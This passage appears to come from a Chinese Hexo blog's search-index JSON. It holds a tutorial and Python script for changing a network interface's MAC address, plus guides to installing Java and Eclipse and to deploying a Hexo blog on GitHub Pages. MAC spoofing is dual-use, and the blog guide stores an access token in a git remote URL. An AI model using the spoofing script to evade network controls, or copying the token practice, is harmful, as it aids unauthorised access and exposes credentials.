#用来开启网络连接\n\n我这里连的是无线网，所以是修改eth0，而有些人会有一个无线接口wlan0只需将eth0修改为wlan0就行了。通过以上指令我们再次输入ifconfig就会发现MAC地址已经修改完成了：\n\n这里可能会提醒你，你的权限不够只需以root权限运行指令就行了。\n通过Python来完成修改MAC地址我们先建立一个Python文件，命名为mac_change.py。建好之后现在前面加上这两行代码：\n#!usr&#x2F;bin&#x2F;env python\n# -*- coding: utf-8 -*-\n\n第一句是告诉系统应当如何执行这个文件，第二句是添加默认编码格式。然后我们导入第一个库：\nimport subprocess\n\n这个库是用来开启一个子进程执行我们的命令。因为我们要对MAC地址进行修改，所以这个库是必要的。\n非常简单只需利用它其中一个模块：\nsubprocess.call(([&quot;ifconfig&quot;, &quot;eth0&quot;, &quot;down&quot;]))\nsubprocess.call(([&quot;ifconfig&quot;, &quot;eth0&quot;, &quot;hw&quot;, &quot;ether&quot;, &quot;00:11:22:33:44:55&quot;]))\nsubprocess.call(([&quot;ifconfig&quot;, &quot;eth0&quot;, &quot;up&quot;]))\n\n然后我们直接运行程序。成功后，再次输入ifconfig：\n\n可以看到，我们成功的利用Python程序修改了MAC地址。这是直接运行，我们也可以在终端运行：\ncd PycharmProjects&#x2F;mac_change&#x2F;     #先到达程序目录\n\npython3 mac_change.py          #运行程序\n\nifconfig                    #查看\n\n\n可以看到，成功通过终端运行程序修改MAC地址程序。\n让用户输入修改信息修改MAC地址这是我们的主要程序已经实现，但是我们想自己修改eth0和wlan0就得去修改程序。这样非常麻烦。所以我们可通过输入信息，来达到修改的目的，定义两个变量接收我们的输入：\ninterface &#x3D; input(&quot;请输入要修改的接口 &gt; &quot;)\nnew_mac &#x3D; input(&quot;请输入新的MAC地址 &gt; &quot;)\n\nsubprocess.call(([&quot;ifconfig&quot;, interface, &quot;down&quot;]))\nsubprocess.call(([&quot;ifconfig&quot;, interface, &quot;hw&quot;, &quot;ether&quot;, new_mac]))\nsubprocess.call(([&quot;ifconfig&quot;, interface, &quot;up&quot;]))\n\n再次运行：\n\n成功完成通过输入修改MAC地址。当然这样的程序并不是太好看，我们可以通过定义函数来达到功能实现的效果：\ninterface &#x3D; input(&quot;请输入要修改的接口 &gt; &quot;)\nnew_mac &#x3D; input(&quot;请输入新的MAC地址 &gt; &quot;)\n\ndef change_mac(interface,new_mac):\n    print(&quot;[+] Change MAC address for &quot; + interface + &quot; to &quot; + new_mac)\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;down&quot;]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;hw&quot;, &quot;ether&quot;, new_mac]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;up&quot;]))\n\nchange_mac(interface,new_mac)\n\n还给与了用户提示信息，再次通过终端运行它：\n\n再次成功完成。这样看起来就有点脚本的感觉了。当然我们还可以对它进行更近一步的优化，这里就不讲了，写好的代码放在下面：\n#!usr&#x2F;bin&#x2F;env python\n# -*- coding: utf-8 -*-\n\nimport subprocess\nimport optparse\nimport re\n\n\ndef change_mac(interface, new_mac):\n    print(&quot;[+] Change MAC address for &quot; + interface + &quot; to &quot; + new_mac)\n    # 这是防止用户随意输入的方法\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;down&quot;]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;hw&quot;, &quot;ether&quot;, new_mac]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;up&quot;]))\n\n\ndef get_arguments():\n    # 给予用户帮助信息\n    parser &#x3D; optparse.OptionParser()\n    parser.add_option(&quot;-i&quot;, &quot;--interface&quot;, dest&#x3D;&quot;interface&quot;, help&#x3D;&quot;Interface to change its MAC address &quot;)\n    parser.add_option(&quot;-m&quot;, &quot;--mac&quot;, dest&#x3D;&quot;new_mac&quot;, help&#x3D;&quot;New MAC address &quot;)\n    (options, arguments) &#x3D; parser.parse_args()\n    if not options.interface:\n        parser.error(&quot;[-] 请指定一个interface,或者使用--help查看帮助 &quot;)\n    elif not options.new_mac:\n        parser.error(&quot;[-] 请指定一个new_mac,或者使用--help查看帮助 &quot;)\n    return options\n\n\ndef get_current_mac(interface):\n    ifconfig_result &#x3D; subprocess.check_output([&quot;ifconfig&quot;, interface])\n    mac_address_search_result &#x3D; re.search(r&quot;\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w&quot;, str(ifconfig_result))\n    # str(ifconfig_result) 这是python3\n    if mac_address_search_result:\n        return mac_address_search_result.group(0)\n    else:\n        print(&quot;[-] 无法读取MAC地址&quot;)\n\n\noptions &#x3D; get_arguments()\ncurrent_mac &#x3D; get_current_mac(options.interface)\nprint(&quot;Current MAC &#x3D; &quot;+str(current_mac))\n\nchange_mac(options.interface, options.new_mac)\n\ncurrent_mac &#x3D; get_current_mac(options.interface)\nif current_mac &#x3D;&#x3D; options.new_mac:\n    print(&quot;[+] MAC地址修改成功:&quot;+current_mac)\nelse:\n    print(&quot;MAC地址修改失败&quot;)\n\n\n","slug":"修改MAC地址","date":"2021-09-10T14:29:28.000Z","categories_index":"修改MAC地址","tags_index":"payload","author_index":"Longw"},{"id":"3c31ab40e966953ecfabe666f24c6141","title":"java安装","content":"\n\n安装Java集成环境JDK与JRE  JRE是Java的运行环境，是运行Java程序所必要的。而JDK是Java的开发环境，它里面就包含了JRE，所以我们学习Java就必须安装JDK。（这里的版本是Windows的）\nJDK安装首先，我们访问这个网址：https://www.oracle.com/cn/java/technologies/javase-downloads.html\n进去后，我们将看到如下界面：\n\n接着，我们往下翻看到Java SE 8下面有个Oracle JDK在下面有个JDK Download。我们点击它进入下面这个界面：\n\n这里讲一下，目前为止Java 8这个版本都是最流行，最稳定也是最适合我们学习的。我们往下翻看到：\n\n然后我们点击下载链接，接着会弹出同意链接，我们点击同意后继续下载。接着会弹出登录页面，有Oracle账户直接登录，没有我们就选择注册就行了。都是中文，把该填的都填上就行了。然后我们就可以下载了。等到下载好了之后，我们双击它进行安装。安装时，最开始的默认位置我们不要改：\n\n直接下一步，接着会安装JRE，同样安装到默认文件夹里，点击下一步：\n\n安装好之后，我们需要查看一下是否安装成功。win+r打开cmd，在里面输入：\njava -version\n\n出现以下页面代表安装成功了：\n\n测试Java程序现在我们还没有安装Java的程序编写工具，我们先用记事本书写第一个Java程序：\npublic class HelloWorld&#123;\n        public static void main(String[] args)&#123;\n                System.out.println(&quot;HelloWorld!&quot;);\n        &#125;\n&#125;\n\n在记事本里输入一下代码，然后我们保存为HelloIWorld.java格式的文件。接着在盘符里新建一个Javatest文件夹并将我们写好的Java文件放到这个Javatest文件夹里面。我们直接在文件夹目录地址上输入cmd，回车：\n\n进入后我们输入这行代码，将我们写好的Java文件进行编译：\njavac HelloWorld.java\n\n回车发现，显示javac不是内部命令提示。这是就需要配置环境变量了。打开我们安装Java的文件夹，打开如下路径：C:\\Program Files\\Java\\jdk1.8.0_301\\bin  我们复制这个路径。右键此电脑选择属性，在搜索框搜索环境变量，我们选择编辑账户的环境变量，我们选择中间的新建，添加变量名为JAVA_HOME,地址为：C:\\Program Files\\Java\\jdk1.8.0_301     确定。接着我们点击path，选择编辑，选择新建，输入：**%JAVA_HOME%\\bin**。接着我们保存就好。\n配置好环境变量后，我们在重新从文件夹里打开cmd，再次输入：\njavac HelloWorld.java\n\n这时我们发现没有问题。打开文件夹发现多了一个HelloWorld.class的文件，这就是Java文件的编译文件。在cmd中我们再输入：\njava HelloWorld\n\n发现成功输出：\n\n需要记住的一点是，每当我们修改.java文件里的程序内容，我们都需要对它再次进行编译，不然我们执行的永远是以前编译好的程序内容。\nEclipse的下载和安装Eclipse的下载和安装我们打开这个链接：https://www.eclipse.org/downloads/ 。打开之后，我们往下滑找到那个长方形的大的黄色按钮，我们选择下面的那个：Download Packages。接着在新页面我们选择：\n\n点击进入下载页面，然后我们点击Download进行下载。接着就是耐性等待下载完成。\n下载完成后我们将它解压到我们有空余空间的盘符里。如放到D盘的根目录，接下来我们双击运行程序\n发现需要我们选择工作区，就是Java文件的保存位置。我们可以在D盘新建一个workspace文件夹，然后将路径改到那个文件夹的位置。选择launch运行，看到欢迎页面。到此位置以及安装成功了。\n现在我们为方便以后写代码，修改一下字号：**Windows—–&gt;preferences——-&gt;General——-&gt;Appearance——–&gt;Colos and Fonts—–&gt;Basic————-&gt;Text Font————-&gt;Edit…**。选择自己想要的字体和字号就行。\n但是要注意不要选择带有@符号的，会导致中文字体倾斜。\n\n","slug":"java安装","date":"2021-09-05T10:37:40.000Z","categories_index":"Java安装","tags_index":"Java","author_index":"Longw"},{"id":"10e502baa80f2697db123aad5a708fe1","title":"关于如何建立blog","content":"\n\n关于如何建立向我这样子的博客1.首先需要搭建环境npm和node.js的安装我们直接安装nvm,用它来安装及管理node.js和npm。\n下载地址：https://github.com/coreybutler/nvm-windows/releases\n对应的系统下载对应的最新版本就行了，我是用的windows直接下载nvm-setup.zip，下载完成后直接双击运行。默认安装就行，期间修改安装路径放到你想安装的盘里。C盘够大的话放在C盘也没什么问题，我C盘内存不太大就放在D盘里面了。\n\n由于我已经安装完成就不放截图了，傻瓜式安装大家都会。\n安装完成后，win+r打开cmd输入nvm即可查看当前版本的相关信息，如图所示：\n\n接下来，我们需要安装node.js，node.js自带npm。运行命令：\nnvm install 12.14.0\n\n这里需要注意的是，安装的版本不要太高，不然等你修改主题的时候发现不匹配就糟糕了。我这里安装12.14.0版本，适配了我这个主题。\n\n安装完成后来看几条nvm的命令：\n查看node.js版本的，能看到你安装了几个node\nnvm list    \n\n使用node.js的版本\nnvm use 12.14.0\n\n卸载node.js版本\nnvm uninstall 12.14.0\n\n安装完成就可以输入使用命令了，注意如果你这里使用不了，那就是你没有将node.js添加到环境变量里。因为一般是默认就配置好了，我这边就不讲了，有问题看这边：https://www.cnblogs.com/mmit/p/12623348.html\nhexo安装接下来就是我们的神器hexo的安装了，它将自动帮助我们生成一个默认的博客框架。安装的时候就要用到我们刚才安装node.js的时候自带的npm了，打开cmd输入：\nnpm install -g cnpm --registry&#x3D;http:&#x2F;&#x2F;registry.npm.taobao.org\n\n回车安装，这里使用了淘宝的源安装cnpm，这样安装速度快一点。这里我们耐心等待安装完成就行了。安装好之后输入命令：\ncnpm install -g hexo-cli\n\n用来安装hexo，等待安装完成后就可以输入：\nhexo -v\n\n查看hexo的版本信息，出现如下界面时就表示安装成功了：\n\nGit安装现在就来安装Git，这是我们用将博客布置到github上的工具。至于其他的功能有兴趣后面可以自己摸索。安装的方法可用这个连接查看：https://blog.csdn.net/qq_39377418/article/details/95199800?ops_request_misc=%7B%22request%5Fid%22%3A%22159022752019724839242812%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=159022752019724839242812&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_v3-1-95199800.first_rank_ecpm_v1_pc_rank_v3&amp;utm_term=git%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B+windows\n下载新版本安装时，安装配置文件选项跟链接里有些不一样，实在不知道怎么办可以下载与链接里相同的版本就行了。\n2.生成hexo默认版本博客在前面安装好Git之后我们还需要对它进行配置。首先我们需要github的账号，因为我们需要在github上寄存我们的博客，以便我们在公网上对它进行访问。在注册好github账号后。我们双击Git运行它，输入这两条命令：  \nname是你的github账号     &#101;&#97;&#109;&#x69;&#108;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#x6d;是你的邮箱\ngit config --global user.name &quot;name&quot;\ngit config --global user.email &quot;eamil@qq.com” \n\n接下来就轻松了，我们在自己的盘符中建立一个文件夹blog用来存放我们hexo博客的默认文件。win+r进入cmd，我们将路径转到建好的文件夹blog中，输入命令：\nhexo init\n\n来初始化配置默认博客文件。如果不成功，可能是Git的环境变量没有配置好，去配置好继续输入命令就行。当出现 INFO Start blogging with Hexo！就代表你已经配置成功了。\n继续输入cmd命令：\nhexo s\n\n在本地运行博客，我们将会在localhost：4000中预览我们的博客：\n\n页面不一样很正常，我这里对主题进行了配置。反正你肯定能看到helloworld这篇文章，这是默认生成的。\n到这里，你的博客已经生成好了。接下来，就是将博客部署到github项目库里，让我们能通过链接访问。\n3.将博客部署到github上首先，我们需要用到一个插件。在cmd中输入命令：\ncnpm install hexo-deployer-git --save\n\n进行安装，安装完成后。我们要在空荡荡的github主页上建立我们的第一个项目库。他的名字叫做：\ngithubname.github.io这里的githubname是你的github的账户名。使用chrome登录到github中，在右边头像里选择Your repositories—-&gt;选择new—–&gt;在Repository name 中填写上我们的项目名字—–&gt;直接到下面带点Create repository 即可创建完成。\n其次，我们到blog文件夹中修改**_config.yml** 文件，用记事本打开即可，ctrl+f打开搜索，查找deploy：。然后我们对它进行配置。如图：\n\n你只需修改repo为你自己的GitHub项目库地址就行。可以在Your repositories—-&gt;选择建好的项目库名字进入详情页——–&gt;点击code就会出现链接地址，我们只需将它复制粘贴即可。\n最后，就是将项目部署到github库中.win+r输入cmd，转到blog路径。不会的例子如下图：\n\n进入路径后我们只需要输入命令：\nhexo d\n\n接下来输入账号密码即可，要输入两次。注意：\n你将会看到下面这句错误提示：remote: Support for password authentication was removed on August 13, 2021. 这是因为github将密码换成了token。你必须生成自己的token替换成密码才能将项目部署到github上。生成token教程如下：\n选择头像里的setting——-&gt;选择Developer setting——&gt;选择personal access token—–&gt;选择create new token。之后我们需要设置token的有效期和权限范围，这是可以用chrome自带的翻译查看选项意思，当然rope选项是一定要选择的。然后选择Generate token将会生成token，这个时候一定要将token复制保存起来，以防止后面我们刷新后找不到了。现在我们再次使用命令 hexo d 在上传时填写密码的第二次操作时将我们的token放到密码输入行里，出现Branch ‘master’ set up to track remote branch ‘master’from’https://github.com/liao545/liao545.github.io.git&#39;.的提示时，代表上传成功了。为了防止麻烦我们可以输入命令：\ngit remote set-url origin https:&#x2F;&#x2F;&lt;your_token&gt;@github.com&#x2F;&lt;USERNAME&gt;&#x2F;&lt;REPO&gt;.git\n\n其中，your_token为你自己生成的token，USERNAME为你github的账户名，REPO 为你的项目库的名字。这样就可以将仓库和token进行绑定，以避免我们重复输入token的操作。部署完成后我们就可以通过项目地址链接对我们的博客进行访问：https://GithubUsername.github.io。\n\n4.绑定域名通过上面的链接，我们可以正常访问我们的博客了。接下来就是如何通过我们自己的专属域名来访问我们的博客了。\n购买域名首先，我们要先去购买一个域名，我以华为云为例。我们注册华为云账号，进行实名认证，不认证你是无法购买域名的。全中文页面，如何购买我就不讲了。购买完成后，要进行信息模板的建立，在域名注册菜单下选择信息模板，添加默认信息模板即可。当审核完成后，我们的域名才会过户到我们的默认模板下。\n域名解析其次，我们进行域名解析，公网解析，选择管理解析，再选择快速添加解析。在出现页面中输入我们博客地址的IP地址即可。IP地址获取我们可以通过win+r输入cmd，再输入ping liao545.github.io 即可获取，完成后将出现两个新的解析条例，他们的属性都是A，我们对其头文件为www的属性修改为CNAME，并将下面地址改为自己购买的域名，如我的就是liaowblog.com。如此我们就完成了域名的解析，一般第二天就会完全生效。\n将域名与github项目绑定最后，就是将我们的域名和github项目进行绑定，以便我们通过域名访问博客。先在我们的blog文件夹中新建一个文本文档，在里面输入www.你的域名，保存后，出来将文档重命名为CNAME，注意没有后缀。然后我们在github项目详情页面点Add file —&gt;create new file—&gt;名字跟上面一样为CNAME，内容也是www.你的域名—–&gt;然后我们创建即可。当修改生效后，我们就可以通过www.你的域名来访问你的博客了。\n5.结尾大致的步骤都在上面了，不会的出错的就按照步骤名和错误提示在网上搜索一下。那我们后续如何书写博客呢？下载一个Typora或者其他的编辑器。用来对md文档进行编辑，然后我们在blog下输入cmd命令：\nhexo new post &lt;title&gt;\n\n然后，title为你的文件名，这样就会在blog—&gt;source—&gt;_post里面生成一个title.md的文件，通过下载好的编辑器对他进行修改即可，打开后里面会有一段代码，包括你的文章名和日期。写好之后，就可以通过以下几条命令上传到我们的博客中了：\nhexo clean\n\nhexo g\n\nhexo d\n\n分别是，清除缓存，生成静态文件，以及上传到github文件。再次访问我们的www.你的域名即可查看新写的博客了。\n\n","slug":"关于如何建立blog","date":"2021-08-21T13:09:42.000Z","categories_index":"博客建立","tags_index":"博客","author_index":"Longw"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2021-08-18T06:43:13.628Z","categories_index":"","tags_index":"","author_index":"Longw"}]